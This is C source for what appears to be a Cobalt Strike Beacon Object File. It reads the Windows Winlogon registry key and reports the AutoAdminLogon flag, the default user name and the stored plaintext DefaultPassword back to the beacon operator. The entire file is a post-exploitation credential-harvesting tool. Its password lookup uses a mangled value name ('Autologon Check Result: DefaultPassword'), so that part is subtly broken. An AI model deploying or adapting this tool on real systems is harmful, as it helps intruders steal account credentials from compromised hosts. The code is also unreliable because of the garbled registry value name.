#include <windows.h>
#include "beacon.h"
#include <stdbool.h>

DECLSPEC_IMPORT WINADVAPI LONG WINAPI Advapi32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI Advapi32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI Advapi32$RegCloseKey(HKEY);

void go(char * args, int len) {
    HKEY hKey;
    DWORD dwType = REG_DWORD, dwSize = sizeof(DWORD), dwValue;
    char szValue[256];
    DWORD dwSize2 = sizeof(szValue);
    DWORD dwSize3 = sizeof(szValue);

    bool autoAdminLogonFound = false;
    bool defaultUserNameFound = false;
    bool defaultPasswordFound = false;

    if (Advapi32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (Advapi32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, &dwType, (LPBYTE)&dwValue, &dwSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: AutoAdminLogon: %d\n", dwValue);
            autoAdminLogonFound = true;
        }
        if (Advapi32$RegQueryValueExA(hKey, "DefaultUserName", NULL, &dwType, (LPBYTE)szValue, &dwSize2) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: DefaultUserName: %s\n", szValue);
            defaultUserNameFound = true;
        }
        dwSize2 = sizeof(szValue);
        if (Advapi32$RegQueryValueExA(hKey, "Autologon Check Result: DefaultPassword", NULL, &dwType, (LPBYTE)szValue, &dwSize2) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: DefaultPassword: %s\n", szValue);
            defaultPasswordFound = true;
        }
        Advapi32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: No Autologon Registry Key Found..\n");
    }

    if (!autoAdminLogonFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: AutoAdminLogon: Not Found\n");
    }
    if (!defaultUserNameFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: DefaultUserName: Not Found\n");
    }
    if (!defaultPasswordFound) {
        BeaconPrintf(CALLBACK_OUTPUT, "Autologon Check Result: DefaultPassword: Not Found\n");
    }
}
